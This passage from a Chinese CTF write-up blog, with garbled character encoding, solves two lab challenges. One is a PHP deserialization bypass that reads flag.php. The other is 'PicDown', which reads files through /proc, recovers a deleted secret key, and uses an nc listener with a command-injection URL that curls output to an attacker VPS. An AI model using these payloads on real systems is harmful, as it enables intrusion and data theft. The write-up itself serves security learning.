            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>__construct()</strong></p>
<blockquote>
<p>æ„é€ å‡½æ•°ï¼ˆconstructor methodï¼Œä¹Ÿç§°ä¸ºæ„é€ å™¨ï¼‰æ˜¯ç±»ä¸­çš„ä¸€ç§ç‰¹æ®Šå‡½æ•°ï¼Œå½“ä½¿ç”¨ new å…³é”®å­—å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œæ„é€ å‡½æ•°å°†ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚</p>
</blockquote>
<p><strong>__destruct</strong></p>
<blockquote>
<p>__destruct() &#x2F;&#x2F;å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</p>
<p>__destruct() æ˜¯ PHP é¢å‘å¯¹è±¡ç¼–ç¨‹çš„ä¸€ä¸ªé‡è¦çš„é­”æ³•å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šåœ¨ç±»çš„ä¸€ä¸ªå¯¹è±¡è¢«åˆ é™¤æ—¶è‡ªåŠ¨è°ƒç”¨ã€‚<br>æˆ‘ä»¬å¯ä»¥åœ¨è¯¥å‡½æ•°ä¸­æ·»åŠ ä¸€äº›é‡Šæ”¾èµ„æºçš„æ“ä½œï¼Œæ¯”å¦‚å…³é—­æ–‡ä»¶ã€å…³é—­æ•°æ®åº“é“¾æ¥ã€æ¸…ç©ºä¸€ä¸ªç»“æœé›†ç­‰</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>  <span class="token comment">//protected: å—ä¿æŠ¤ç±»å‹</span>
    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ€»çš„æ¥è¯´è¦æŸ¥çœ‹filenameä¸º<strong>flag.php</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>æ„æ€å°±æ˜¯åªå…è®¸å–ASCIIç ä¸º32~125çš„å­—ç¬¦</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>è¿™ä¸ªé­”æ³•å‡½æ•°ä¸­å¯¹opçš„å€¼è¿›è¡Œ<strong>å¼ºç±»å‹åˆ¤æ–­</strong></p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//opç­‰äº1ï¼Œç»™äºˆå†™æ–‡ä»¶æƒé™</span>
           <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//opç­‰äº2ï¼Œç»™äºˆè¯»æ–‡ä»¶æƒé™</span>
           <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
           <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>å¯¹opå€¼è¿›è¡Œ<strong>å¼±ç±»å‹åˆ¤æ–­</strong>ï¼Œç”±äºæˆ‘ä»¬åªéœ€è¦è¯»å‡ºflagã€‚op&#x3D;2å³å¯ã€‚ä»å¸ˆå‚…ä»¬çš„æ–‡ç« ä¸­äº†è§£åˆ°åœ¨php7.1++ä¸­å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæœ¬åœ°åºåˆ—åŒ–çš„æ—¶å€™å°†å±æ€§æ”¹ä¸ºpublicè¿›è¡Œç»•è¿‡å³å¯</p>
</blockquote>
<p>é‚£ä¹ˆè¯¥å¦‚ä½•ç»•è¿‡å‘¢?å½“**$op&#x3D;2**æ—¶</p>
<blockquote>
<p>op &#x3D;&#x3D;&#x3D; â€œ2â€ä¸ºå‡ï¼Œop &#x3D;&#x3D; â€œ2â€ä¸ºçœŸã€‚op &#x3D;&#x3D;&#x3D; â€œ2â€ä¸ºå‡,é‚£å°±ç»•è¿‡__destruct()ã€‚å†™ç€å°±æœ‰readæƒé™äº†ã€‚</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token variable">$op</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>  <span class="token comment">//protected: å—ä¿æŠ¤ç±»å‹</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span><span class="token comment">//å€¼éšæ„</span>
    <span class="token punctuation">&#125;</span>
  <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$b</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¾—åˆ°<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</code><br><img src="https://img-blog.csdnimg.cn/364916f0203944bda37d24a09796566b.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/f495a0667a374112af7a7e1de5d21e5a.png" alt="2"><br>å¾—åˆ°flagã€‚</p>
<h2 id="ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown"><a href="#ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown" class="headerlink" title="[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown"></a>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</h2><p>æ‰“å¼€ç½‘é¡µåå‘ç°åªæœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œå¼€å¯burpçš„ä»£ç†å°è¯•å¾€è¾“å…¥æ¡†é‡Œè¾“å…¥ä¸€äº›å†…å®¹æŸ¥çœ‹æ•°æ®åŒ…<br><img src="https://img-blog.csdnimg.cn/direct/75f5aa86c5c244239025304dd82c1963.png" alt="456"><br>å°è¯•ä¸€ä¸‹è¾“å…¥ä¸€æ®µç½‘å€ï¼Œå‘ç°å›æ˜¾é¡µé¢<br><img src="https://img-blog.csdnimg.cn/direct/7ea54db3e4ef4a0c8f0aa7a0e98c1b0c.png" alt="123"><br>é‚£ä¹ˆå°è¯•ä¸€ä¸‹æ–‡ä»¶è¯»å–ï¼Œå‘ç°å¯ä»¥æˆåŠŸè¯»å–ï¼Œï¼ˆç”±äºé¢˜ç›®è®¾ç½®é—®é¢˜ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥è¯»å–flagï¼‰<br><img src="https://img-blog.csdnimg.cn/direct/ed299587d11745ccacc90070a75ef95f.png" alt="456"><br>å¸¸è§„åšæ³•å°±æ˜¯å…ˆè¯»å–æºç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆè¯»å–å¯åŠ¨å½“å‰é¢˜ç›®è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤</p>
<blockquote>
<p>&#x2F;proc&#x2F;self&#x2F;cmdline</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/direct/8e42cd7cb3724b7c8cf941bf2d1e2950.png" alt="123"><br>å‘ç°æ˜¯pythonå¯åŠ¨çš„ï¼Œé‚£ä¹ˆå°±è¯»å–ä¸€ä¸‹æºç app.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response
<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template
<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
<span class="token keyword">import</span> os
<span class="token keyword">import</span> urllib

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

SECRET_FILE <span class="token operator">=</span> <span class="token string">"/tmp/secret.txt"</span>
f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>
SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/page'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">page</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> url<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
            value <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>value<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/octet-stream'</span><span class="token punctuation">)</span>
            response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=beautiful.jpg'</span>
            <span class="token keyword">return</span> response
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            value <span class="token operator">=</span> <span class="token string">"HACK ERROR!"</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        value <span class="token operator">=</span> <span class="token string">"SOMETHING WRONG!"</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>value<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/no_one_know_the_manager'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">)</span>
    <span class="token keyword">if</span> key <span class="token operator">==</span> SECRET_KEY<span class="token punctuation">:</span>
        shell <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>
        res <span class="token operator">=</span> <span class="token string">"ok"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> <span class="token string">"Wrong Key!"</span>

    <span class="token keyword">return</span> res


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ³¨æ„åˆ°ä¸‹é¢è¿™ä¸€æ®µä»£ç </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">SECRET_FILE <span class="token operator">=</span> <span class="token string">"/tmp/secret.txt"</span>
f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>
SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™é‡Œå°†secret.txtæ–‡ä»¶åˆ é™¤äº†ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•å†è¯»å–è¯¥æ–‡ä»¶ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„ï¼Œåœ¨linuxä¸­ä½¿ç”¨openæ–¹æ³•æ‰“å¼€è¯¥æ–‡ä»¶ä¹‹åè¯»å–å®Œå°±ç›´æ¥ç§»é™¤è¯¥æ–‡ä»¶ï¼Œå¹¶æ²¡æœ‰å°†æ”¹æ–‡ä»¶è¿›è¡Œå…³é—­ï¼Œåœ¨&#x2F;procè¿™ä¸ªè¿›ç¨‹çš„pidç›®å½•ä¸‹çš„fdæ–‡ä»¶æè¿°ç¬¦ç›®å½•ä¸‹è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æˆ‘ä»¬å³å¯å¾—åˆ°è¢«åˆ é™¤æ–‡ä»¶çš„å†…å®¹ã€‚&#x2F;proc&#x2F;[pid]&#x2F;fd è¿™ä¸ªç›®å½•é‡ŒåŒ…å«äº†è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„æƒ…å†µï¼Œç›®å½•é‡Œé¢æœ‰ä¸€å †&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;idæ–‡ä»¶ï¼Œidå°±æ˜¯è¿›ç¨‹è®°å½•çš„æ‰“å¼€æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦çš„åºå·ã€‚<br>é€šè¿‡çˆ†ç ´æˆ‘ä»¬å…ˆæ‰¾åˆ°æ–‡ä»¶åœ¨&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3é‡Œé¢<br><img src="https://img-blog.csdnimg.cn/direct/c54238447f1841bb9263c1b70d31cf3e.png" alt="123"><br>çœ‹ä¸€ä¸‹æºä»£ç è¿™ä¸ªæ—¶å€™æˆ‘ä»¬åœ¨<strong>no_one_know_the_manager</strong>æ–‡ä»¶ä¸‹è¿›è¡Œåå¼¹shellï¼Œå…ˆåœ¨æœåŠ¡å™¨ä¸Šç›‘å¬ç«¯å£</p>
<blockquote>
<p>nc -lnvp 80<br>ä¹‹åè®¿é—®é¢˜ç›®ç½‘å€</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;1d9a43f3-c6de-426e-adab-ee27ceb15d1a.node4.buuoj.cn:81&#x2F;no_one_know_the_manager?key&#x3D;ZPMFELffXNlle7DEFSdvsAj55RCsLLQrErtOFZO&#x2F;lOI&#x3D;&amp;shell&#x3D;curl http:&#x2F;&#x2F;vpsip&#x2F;&#96;ls&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/direct/7ec3a00bbb4e4332aefa42451ae0b084.png" alt="456"></p>
